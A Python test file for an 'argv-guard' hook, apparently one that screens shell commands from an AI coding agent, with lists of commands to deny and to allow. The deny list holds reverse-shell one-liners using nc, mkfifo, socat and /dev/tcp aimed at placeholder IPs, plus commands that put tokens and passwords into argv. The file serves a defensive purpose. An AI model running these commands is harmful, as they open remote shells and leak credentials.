#!/usr/bin/env python3
"""Cases for argv-guard.py. Run: python3 ~/.claude/hooks/argv-guard-test.py"""

import importlib.util
import pathlib
import sys

spec = importlib.util.spec_from_file_location("guard", pathlib.Path(__file__).with_name("argv-guard.py"))
guard = importlib.util.module_from_spec(spec)
spec.loader.exec_module(guard)

DENY = [
    # reverse-shell look-alikes and secrets an agent might reach for
    "bash -c 'exec 3<>/dev/tcp/192.0.2.50/22 && echo open'",
    """expect -c 'spawn ssh root@192.0.2.50; expect "password:"; send "hunter2\\r"; interact'""",
    "ssh -R 2222:localhost:22 user@192.0.2.1",
    'curl -H "Authorization: Bearer $HA_TOKEN" http://homeserver.local/api/states',
    # other reverse shells
    "nc -e /bin/sh 10.0.0.1 4444",
    "bash -i >& /dev/null 0>&1",
    "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
    "socat tcp:10.0.0.1:4444 exec:/bin/sh",
    # secrets reaching argv
    'curl -s -H "x-api-key: $DKEY" http://100.64.0.10:3000/api/user.get',
    'curl -H "x-api-key: $(op read op://vault/item/password)" http://x/api',
    'DKEY=$(op read op://x/y/z) && curl -H "x-api-key: ${DKEY}" http://x',
    'env GITHUB_TOKEN=$GH_TOKEN some-tool',
    'flyctl deploy --access-token $FLY_API_TOKEN',
    'sshpass -p secret ssh root@host',
    'curl -u admin:s3cretpass https://example.com',
    'git clone https://someone:ghp_EXAMPLEexampleEXAMPLEexample00000000@github.com/example/repo',
    'git clone https://user:sometoken@github.com/example/repo',
    'curl -H "Authorization: Bearer abcdefghijklmnopqrstuvwxyz012345" https://api.example.com',
    'mytool --password=hunter2',
    'docker login --password hunter2 ghcr.io',
    'sudo something $API_KEY',
    'X=$(curl -H "Authorization: Bearer $TOKEN" https://x)',
    # op run puts the value in the environment; a shell that expands it into argv still leaks
    'op run --env-file .env -- sh -c \'curl -H "Authorization: Bearer $TOKEN" https://x\'',
]

ALLOW = [
    "nc -z 192.0.2.50 22",
    "ssh root@100.64.0.20 'pct exec 100 -- ls'",
    "curl -fsS -H @hdr http://100.64.0.10:3000/api/user.get",
    "printf 'x-api-key: %s\\n' \"$(op read 'op://vault/api key/password')\" > hdr",
    'DKEY=$(op read op://x/y/z)',
    'export GITHUB_TOKEN=$(gh auth token)',
    'GH_TOKEN=$MY_TOKEN gh api user',
    'if [ -z "$TOKEN" ]; then echo missing; fi',
    'echo "$TOKEN" | docker login --password-stdin ghcr.io',
    "curl --config - <<EOF\nheader = \"Authorization: Bearer $TOKEN\"\nEOF",
    'git status && cargo build --release',
    'op item get abcdefghijklmnopqrstuvwxyz --format json | python3 -c "print(1)"',
    'ls ~/.ssh/id_ed25519.pub',
    'cat ~/.claude/settings.json',
    'gh api repos/example/repo/readme --jq .content',
    'echo $HOME $PATH $PWD',
    'op run --env-file .env -- flyctl deploy',
    'op run -- gh api user',
]

failures = 0
for cmd in DENY:
    if guard.check(cmd) is None:
        failures += 1
        print(f"SHOULD DENY: {cmd}")
for cmd in ALLOW:
    reason = guard.check(cmd)
    if reason is not None:
        failures += 1
        print(f"SHOULD ALLOW: {cmd}\n   -> {reason}")
print(f"{len(DENY) + len(ALLOW) - failures}/{len(DENY) + len(ALLOW)} ok")
sys.exit(1 if failures else 0)
